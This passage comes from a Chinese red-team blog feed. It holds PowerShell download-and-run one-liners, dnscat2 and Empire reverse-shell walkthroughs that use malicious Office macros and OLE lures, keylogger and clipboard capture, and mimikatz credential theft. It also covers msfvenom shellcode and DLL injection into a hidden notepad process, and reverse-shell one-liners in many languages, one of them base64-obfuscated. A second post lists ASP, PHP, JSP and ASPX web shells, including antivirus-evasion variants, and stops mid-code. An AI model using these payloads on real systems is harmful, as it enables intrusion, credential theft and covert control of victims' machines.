<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.40.128/Invoke-Portscan.ps1 &#x27;);Invoke-Portscan -Hosts 192.168.40.1 -Ports 1-100</span><br></pre></td></tr></table></figure>



<p><strong>2.4、dnscat2 反弹DNS shell</strong> </p>
<p>dnscat2(<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a>)</p>
<p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p>
<p><strong>Step 1 :</strong> 在linux系统中安装dnscat2（需要ruby环境），然后开始监听:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby dnscat2.rb --dns &quot;domain=pentest.com,host=192.168.1.32&quot; --no-cache -e open</span><br></pre></td></tr></table></figure>

<p><strong>Step 2：</strong>在目标主机上执行如下的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;);Start-Dnscat2 -Domain pentest.com -DNSServer 192.168.1.32</span><br></pre></td></tr></table></figure>

<p><strong>Step 3:</strong> 接着就可以看到反弹过来的shell，输入session -i 1进入第一个会话，输入shell，然后再次输入session -i 2，会看到系统的CMD命令行！！</p>
<h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="2-5、Empire-反弹shell"><a href="#2-5、Empire-反弹shell" class="headerlink" title="2.5、Empire 反弹shell"></a><strong>2.5、Empire 反弹shell</strong></h6><p>Empire(<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell，它的功能有点类似MSF。</p>
<p>注意：此工具疯狂报错，极难安装。</p>
<p>参考连接：<a href="https://blog.csdn.net/qq_41320638/article/details/107136821">https://blog.csdn.net/qq_41320638/article/details/107136821</a></p>
<p><strong><em>*</em>*2.5.**1 安装Empire*</strong>*</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Git clone https://github.com/EmpireProject/Empire</span><br></pre></td></tr></table></figure>

<p>启动Empire</p>
<p>设置监听器 选择渗透测试模块（设置参数àrun&#x2F;execute）  产生payload</p>
<p>最后把payload在目标机上执行  反弹shell</p>
<p><strong><em>*</em>*****2.5.******2 利用office宏定义反弹shell*</strong>*</p>
<p>**Step 1:**我们首先查看一下Empire的帮助信息：help</p>
<p>接着输入listeners设置监听器，后面跟上7中模式 </p>
<p>选用http，然后execute</p>
<p>注意：可以通过set Name shuteer 来设置该监听器的名称</p>
<p>如果之前已经添加过监听器，后来添加的监听器要设置名字以及监听的端口</p>
<p>set Name <em>listener_name</em> set Host <em>IP:port</em></p>
<p><strong>Step 2：</strong>back退出当前环境，然后生成payload，使用usestager <em>moudle_name</em>，multi为通用模块，osx是MAC系统的模块，其余均为Windows系统的模块。 </p>
<p>输入usestager windows&#x2F;macro shuteer(监听器的名字) #生成payload</p>
<p>execute</p>
<p>产看生成的payload</p>
<p>生成&#x2F;tmp&#x2F;macro 攻击代码后，新建一个word 创建宏，注意：需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”。</p>
<p>然后产生的payload添加到测试文档的宏中。</p>
<p><strong>Step 3：</strong>诱导用户去打开该测试文档，然后就可kali终端中有接收到的测试数据</p>
<p>进入反弹回来的会话中，使用interact命令连接主机，intetact DMEYHL1V（会话名字）</p>
<p>Shell whoami查看当前用户 shell +命令</p>
<p>Shell net user 获取系统用户</p>
<p>sysinfo获取系统信息</p>
<p>运行mimikatz，获取当前活动用户账号信息</p>
<p>获取当前进程的ID：getpid      getuid  pwd  </p>
<p>输入creds可以自动过滤、整理出获取的用户密码（有密文和明文）</p>
<p><em><strong>*2.5.3 利用office OLE对象插入bat文件反弹shell*</strong></em></p>
<p>Step 1：要想设置launcher_bat木马，需要输入usestager windows&#x2F;launcher_bat http(监听器的名称)</p>
<p>Step 2：将产生的bat文件直接复制到靶机上运行，就可以看到反弹的shell</p>
<p>获取系统运行的进程</p>
<p>为了增加迷惑性，可以将批处理文件插入到office文档中，现创建一个excel表格，在excel中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击该文件，执行后，即可成功反弹shell。</p>
<p>*<strong>2.5.4 Empire产生VBS木马反弹shell</strong></p>
<p>usestager windows&#x2F;launcher_vbs</p>
<p>execute</p>
<p>在靶机上运行该VBS脚本即可</p>
<p>注意：如果要生成基于VBS的Powershell代码，设置完listener和userstager之后，不用输入execute，直接输入back，然后输入Launcher powershell shuteer（监听器的名字）</p>
<p><strong>2.5.5 信息收集</strong></p>
<p>输入usemodule collection ，然后按TAB键查询完整的列表</p>
<p><em><strong>2.5.5 .1 截屏</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule collection/screenshot(Empire: powershell/collection/screenshot) &gt; execute</span><br></pre></td></tr></table></figure>

<p><em><strong>2.5.5 .2</strong></em> 键盘记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Empire: PDGNXFEK) &gt; usemodule collection/keylogger(Empire: powershell/collection/keylogger) &gt; run</span><br></pre></td></tr></table></figure>

<p>就会在agent.log的同级目录中生成keystrokes.txt，打开该文件便可以看到记录的数据！</p>
<p>关闭键盘记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BackJobsJobs kill JOB_name</span><br></pre></td></tr></table></figure>

<p><strong>2.5.5 .3</strong> 剪贴板记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule collection/clipboard_monitor(Empire: powershell/collection/clipboard_monitor) &gt; execute</span><br></pre></td></tr></table></figure>

<p>然后目标主机上复制一句话，停止方法如上所示。</p>
<p><strong>2.5.5 .4</strong> 查看域共享文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FEK) &gt; usemodule  situational_awareness/network/powerview/share_finder(Empire: powershell/situational_awareness/network/powerview/share_finder) &gt; execute</span><br></pre></td></tr></table></figure>

<p>注意：当前环境没有域，后面讲完域渗透之后可以测试</p>
<p><strong>2.5.5 .5</strong> 目标主机信息（域环境）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/host/winenum(Empire: powershell/situational_awareness/host/winenum) &gt; run</span><br></pre></td></tr></table></figure>

<p>或者使用如下模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/host/computerdetails*(Empire: powershell/situational_awareness/host/computerdetails) &gt; run</span><br></pre></td></tr></table></figure>

<p><strong>2.5.5 .6</strong> ARP扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/network/arpscan(Empire: powershell/situational_awareness/network/arpscan) &gt;</span><br></pre></td></tr></table></figure>

<p>然后需要设置扫描的范围：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set Range 192.168.1.1-192.168.1.254</span><br></pre></td></tr></table></figure>

<p><strong>2.5.5 .7</strong> DNS信息获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; set range 1usemodule situational_awareness/network/reverse_dns(Empire: powershell/situational_awareness/network/reverse_dns) &gt; run</span><br></pre></td></tr></table></figure>

<p>或者使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/host/dnsserver(Empire: powershell/situational_awareness/host/dnsserver) &gt; run</span><br></pre></td></tr></table></figure>

<p><strong><em>*</em>*****2.5.******5 .8*</strong>* 查找域控登录服务器IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/network/powerview/user_hunter(Empire: powershell/situational_awareness/network/powerview/user_hunter) &gt; execute</span><br></pre></td></tr></table></figure>

<p><strong><em>*</em>*****2.5.******5 .9*</strong>* 本地管理组访问模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Empire: PDGNXFEK) &gt; usemodule situational_awareness/network/powerview/find_localadmin_access(Empire: powershell/situational_awareness/network/powerview/find_localadmin_access) &gt; run\</span><br></pre></td></tr></table></figure>



<p><strong><em>*</em>*****2.5.******5 .10*</strong>* 获取域控制器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule susemodule situational_awareness/network/powerview/get_domain_controller(Empire: powershell/situational_awareness/network/powerview/get_domain_controller) &gt; run</span><br></pre></td></tr></table></figure>



<h6 id="2-6、PowerSploit"><a href="#2-6、PowerSploit" class="headerlink" title="2.6、PowerSploit**"></a><strong>2.6</strong>、PowerSploit**</h6><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。</p>
<p>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell.</p>
<p><strong>2.6.1 执行ShellCode反弹Meterpreter Shell</strong></p>
<p>注意：此实验失败（看脸，有的机器行，有的不行）</p>
<p><strong>Step 1</strong>：下载PowerSploit到本地，使用python搭建简易服务器（python -m SimpleHTTPServer 9889）</p>
<p><a href="http://192.168.1.18:9889/CodeExecution/Invoke-Shellcode.ps1">http://192.168.1.18:9889/CodeExecution/Invoke-Shellcode.ps1</a></p>
<p><strong>Step 2</strong>：MSF中选择reverse_tcp模块进行反弹</p>
<p>然后使用msfvenom命令生成powershell脚本木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.28 lport=4444 -f powershell -o ./test</span><br></pre></td></tr></table></figure>



<p>将生成的test文件复制到python搭建的web服务器中，于是有：</p>
<p><a href="http://192.168.1.18:9889/test">http://192.168.1.18:9889/test</a></p>
<p>**step 3:**在目标机上执行powershell下载脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/CodeExecution/Invoke-Shellcode.ps1&#x27;)</span><br></pre></td></tr></table></figure>

<p>下载MSF产生的木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/test&#x27;)</span><br></pre></td></tr></table></figure>

<p>最后运行木马文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode ($buf)  -Force</span><br></pre></td></tr></table></figure>

<p>其中-shellcode()b表示执行恶意代码的函数，$buf是test文件中恶意代码</p>
<p>最后就能在MSF看到反弹的shell</p>
<p><strong><em>*</em>***2.6.****2 DLL注入反弹shell*</strong>*</p>
<p>使用模块的是Invoke-DllInjection.ps1，它是一个DLL注入的脚本</p>
<p>首先还是要下载脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/CodeExecution/Invoke-DllInjection.ps1 &#x27;)</span><br></pre></td></tr></table></figure>

<p>然后在kali中生成一个DLL注入脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.28 lport=6667 -f dll -o ./pentest.dll</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.129 lport=6667 -f dll  -a x64 --platform windows -o  ./test.dll</span><br></pre></td></tr></table></figure>

<p>接着将生成好的DLL文件复制python服务器中，于是有：</p>
<p><a href="http://192.168.1.18:9889/pentest.dll">http://192.168.1.18:9889/pentest.dll</a></p>
<p>然后在目标机上下载还文件到C盘</p>
<p>在目标机上启动一个进程进行DLL注入，可以后续的注入更加隐蔽，使用如下的命令新建一个名为notepad.exe的隐蔽进程 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist|findstr notepad.exe</span><br></pre></td></tr></table></figure>

<p>然后执行下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/CodeExecution/Invoke-DllInjection.ps1 &#x27;);Invoke-DllInjection -ProcessID 1124 -Dll c:\pentest.dll</span><br></pre></td></tr></table></figure>

<p>最后在MSF能看到反弹的shell。</p>
<h1 id="常见shell反弹方式（二）"><a href="#常见shell反弹方式（二）" class="headerlink" title="常见shell反弹方式（二）"></a>常见shell反弹方式（二）</h1><p>今天继续写第二部分：</p>
<p>今日目录：</p>
<h5 id="3、编程语言反弹shell"><a href="#3、编程语言反弹shell" class="headerlink" title="3、编程语言反弹shell"></a>3、编程语言反弹shell</h5><h6 id="3-1、python"><a href="#3-1、python" class="headerlink" title="3.1、python"></a>3.1、python</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.101&quot;,1001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python 正向链接 攻击者主动链接  nc -nv 目标机ip  1025端口</span><br><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwxMDI1KSkKcy5saXN0ZW4oMSkKKGMsYSk9cy5hY2NlcHQoKQp3aGlsZSAxOgogZD1jLnJlY3YoNTEyKQogaWYgJ2V4aXQnIGluIGQ6CiAgcy5jbG9zZSgpCiAgc3lzLmV4aXQoMCkKIHI9b3MucG9wZW4oZCkucmVhZCgpCiBjLnNlbmQocikK&#x27;.decode(&#x27;base64&#x27;))”</span><br></pre></td></tr></table></figure>

<h6 id="3-2、perl"><a href="#3-2、perl" class="headerlink" title="3.2、perl"></a>3.2、perl</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.40.1&quot;;$p=8999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;3.2 perl</span><br></pre></td></tr></table></figure>

<h6 id="3-3-php"><a href="#3-3-php" class="headerlink" title="3.3 php"></a><strong>3.3</strong> <strong>php</strong></h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.40.1&quot;,8999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h6 id="3-4-java"><a href="#3-4-java" class="headerlink" title="3.4 java"></a><strong>3.4</strong> <strong>java</strong></h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.40.1/1234;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</span><br></pre></td></tr></table></figure>

<h6 id="3-4-ruby"><a href="#3-4-ruby" class="headerlink" title="3.4 ruby"></a><strong>3.4</strong> <strong>ruby</strong></h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;f=TCPSocket.open(&quot;192.168.40.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>

<h6 id="3-5-lua"><a href="#3-5-lua" class="headerlink" title="3.5. lua"></a><strong>3.5.</strong> <strong>lua</strong></h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;192.168.40.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>

<h5 id="4、Nc-反弹shell"><a href="#4、Nc-反弹shell" class="headerlink" title="4、Nc 反弹shell"></a>4、Nc 反弹shell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有-e 模式：nc -e /bin/sh 192.168.40.1 1234</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无-e 模式：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.40.1 1234 &gt;/tmp/f（FIFO文件）</span><br></pre></td></tr></table></figure>

<h5 id="5、SSL-反弹shell-加密-目标机反弹shell-攻击者监听端口-nc-lvnp-1234"><a href="#5、SSL-反弹shell-加密-目标机反弹shell-攻击者监听端口-nc-lvnp-1234" class="headerlink" title="5、SSL 反弹shell(加密)目标机反弹shell 攻击者监听端口 nc -lvnp 1234"></a><strong>5、SSL 反弹shell(加密)目标机反弹shell</strong> <strong>攻击者监听端口 nc</strong> <strong>-lvnp 1234</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hacker:</span><br><span class="line">生成证书：openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">使用证书加密链路并监听端口：openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class="line">Target:</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.198.200:8888 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>

<h5 id="6、Socat反弹shell"><a href="#6、Socat反弹shell" class="headerlink" title="6、Socat反弹shell"></a><strong>6、</strong>Socat反弹shell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VPS: socat TCP-LISTEN:12345 –</span><br><span class="line">Target：</span><br><span class="line"># wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat   # 第一步：下载socat到/tmp目录下</span><br><span class="line"># chmod 755 /tmp/socat  </span><br><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.31.174：12345</span><br></pre></td></tr></table></figure>

<h5 id="7、不使用nc来反弹shell"><a href="#7、不使用nc来反弹shell" class="headerlink" title="7、不使用nc来反弹shell"></a><strong>7、</strong>不使用nc来反弹shell</h5><p>不使用nc来反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 192.168.40.1 1234 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 192.168.40.1 1234 | /bin/bash | telnet 192.168.40.1 2345 (需要在攻击者PC上监听两个端口：1234 2345，1234 输入命令， 2345 输出)</span><br></pre></td></tr></table></figure>

<h5 id="8、telnet反弹shell"><a href="#8、telnet反弹shell" class="headerlink" title="8、telnet反弹shell"></a><strong>8、</strong>telnet反弹shell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）telnet vpsIP 端口1 | /bin/sh | telnet vpsIP 端口2（2）nc开两个终端，同时监听两个端口，一个端口用于输入命令，另一个端口用于显示结果。</span><br></pre></td></tr></table></figure>

<p>上述的反弹shell的命令时需要在肉鸡中执行，借助于webshell的权限来执行。</p>
<p>攻击者需要执行的命令是：nc -lvvp 8080</p>
<h5 id="9、注意"><a href="#9、注意" class="headerlink" title="9、注意"></a>9、注意</h5><p>反弹回来的shell不是TTY模式，可以执行：python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
<p>www-data@me:&#x2F;tmp$</p>
<p>www-data：当前用户</p>
<p>me：主机名</p>
<p>&#x2F;tmp：当前工作目录</p>
<p>$:表示当前用户是一个普通用户</p>
<p>#:表示是root</p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>常用一句话木马</title>
    <url>/posts/1962ff09.html</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;system($_GET[&#x27;xxx&#x27;]);&lt;/script&gt;</span><br><span class="line">&lt;%eval request(&quot;c&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;c&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;c&quot;))%&gt;</span><br><span class="line">&lt;%ExecuteGlobal request(&quot;sb&quot;)%&gt;</span><br><span class="line">%&gt;&lt;%Eval(Request(chr(35)))%&gt;&lt;%</span><br><span class="line">&lt;%if request (&quot;c&quot;)&lt;&gt;&quot;&quot;then session(&quot;c&quot;)=request(&quot;c&quot;):end if:if session(&quot;c&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;c&quot;)%&gt;</span><br><span class="line">&lt;%                                 %&gt;</span><br><span class="line">&#x27;备份专用</span><br><span class="line">&lt;%eval(request(&quot;c&quot;)):response.end%&gt;</span><br><span class="line">&#x27;无防下载表,有防下载表突破专用一句话</span><br><span class="line">&lt;%execute request(&quot;c&quot;)%&gt;&lt;%&lt;%loop&lt;%:%&gt;</span><br><span class="line">&lt;%&lt;%loop&lt;%:%&gt;&lt;%execute request(&quot;c&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;c&quot;)&lt;%loop&lt;%:%&gt;</span><br><span class="line">&#x27;防杀防扫专用</span><br><span class="line">&lt;%if Request(&quot;c&quot;)&lt;&gt;&quot;&quot; ThenExecuteGlobal(Request(&quot;c&quot;))%&gt;</span><br><span class="line">&#x27;不用&quot;&lt;,&gt;&quot;</span><br><span class="line"></span><br><span class="line">&lt;script language=VBScript runat=server&gt;execute request(&quot;c&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;% @Language=&quot;JavaScript&quot; CodePage=&quot;65001&quot;var lcx=&#123;&#x27;名字&#x27;:Request.form(&#x27;#&#x27;),&#x27;性别&#x27;:eval,&#x27;年龄&#x27;:&#x27;18&#x27;,&#x27;昵称&#x27;:&#x27;请叫我一声老大&#x27;&#125;;lcx.性别((lcx.</span><br><span class="line">名字)+&#x27;&#x27;) %&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language=vbs runat=server&gt;eval(request(&quot;c&quot;))&lt;/script&gt;</span><br><span class="line">&lt;script language=vbs runat=server&gt;eval_r(request(&quot;c&quot;))&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&#x27;不用双引号</span><br><span class="line">&lt;%eval request(chr(35))%&gt;</span><br><span class="line">&#x27;可以躲过雷客图</span><br><span class="line">&lt;%set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;) ms.Language=&quot;VBScript&quot; ms.AddObject&quot;response&quot;,response ms.AddObject</span><br><span class="line"></span><br><span class="line">&quot;request&quot;,request ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;c&quot;&quot;))&quot;)%&gt;</span><br><span class="line">&lt;%dy=request(&quot;dy&quot;)%&gt;&lt;%Eval(dy)%&gt;</span><br><span class="line">&#x27;容错代码</span><br><span class="line">if Request(&quot;sb&quot;)&lt;&gt;&quot;&quot; then ExecuteGlobal request(&quot;sb&quot;) end if</span><br><span class="line">PHP一句话</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST1);?&gt;</span><br><span class="line">&lt;?php if(isset($_POST[&#x27;c&#x27;]))&#123;eval($_POST[&#x27;c&#x27;]);&#125;?&gt;</span><br><span class="line">&lt;?php system($_REQUEST1);?&gt;</span><br><span class="line">&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt;</span><br><span class="line">&lt;?php eval_r($_POST1)?&gt;</span><br><span class="line">&lt;?php @eval_r($_POST1)?&gt;//容错代码</span><br><span class="line">&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句</span><br><span class="line">&lt;?$_POST[&#x27;c&#x27;]($_POST[&#x27;cc&#x27;]);?&gt;</span><br><span class="line">&lt;?$_POST[&#x27;c&#x27;]($_POST[&#x27;cc&#x27;],$_POST[&#x27;cc&#x27;])?&gt;</span><br><span class="line">&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#x27;h&#x27;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;</span><br><span class="line">&lt;?php echo `$_GET[&#x27;r&#x27;]` ?&gt;</span><br><span class="line">//绕过&lt;?限制的一句话</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//绕过&lt;?php ?&gt;限制的一句话 </span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line">JSP一句话</span><br><span class="line"></span><br><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br><span class="line">提交客户端</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">ASPX一句话</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">普通的php一句话：&lt;?php @eval($_POST[&#x27;r00ts&#x27;]);?&gt;</span><br><span class="line">普通的asp一句话：&lt;%                                         %&gt;</span><br><span class="line">aspx突破一流的：</span><br><span class="line">dim da</span><br><span class="line">set fso=server.createobject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">path=request(&quot;path&quot;)</span><br><span class="line">if path&lt;&gt;&quot;&quot; then</span><br><span class="line">data=request(&quot;da&quot;)</span><br><span class="line">set da=fso.createtextfile(path,true)</span><br><span class="line">da.write data</span><br><span class="line">if err=0 then</span><br><span class="line">Response.Write &quot;yes&quot;</span><br><span class="line">else</span><br><span class="line">Response.Write &quot;no&quot;</span><br><span class="line">end if</span><br><span class="line">err.clear</span><br><span class="line">end if</span><br><span class="line">set da=nothing</span><br><span class="line">set fos=nothing</span><br><span class="line">Response.Write &quot;&lt;form action=&quot; method=post&gt;&quot;</span><br><span class="line">Response.Write &quot;&lt;input type=text name=path&gt;&quot;</span><br><span class="line">Response.Write &quot;&lt;br&gt;&quot;</span><br><span class="line">Response.Write &quot;当前文件路径:&quot;&amp;server.mappath(request.servervariables(&quot;script_name&quot;))</span><br><span class="line">Response.Write &quot;&lt;br&gt;&quot;</span><br><span class="line">Response.Write &quot;操作系统为:&quot;&amp;Request.ServerVariables(&quot;OS&quot;)</span><br><span class="line">Response.Write &quot;&lt;br&gt;&quot;</span><br><span class="line">Response.Write &quot;WEB服务器版本为:&quot;&amp;Request.ServerVariables(&quot;SERVER_SOFTWARE&quot;)</span><br><span class="line">Response.Write &quot;&lt;br&gt;&quot;</span><br><span class="line">Response.Write &quot;&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;&quot;</span><br><span class="line">Response.Write &quot;&lt;br&gt;&quot;</span><br><span class="line">Response.Write &quot;&lt;input type=submit value=save&gt;&quot;</span><br><span class="line">Response.Write 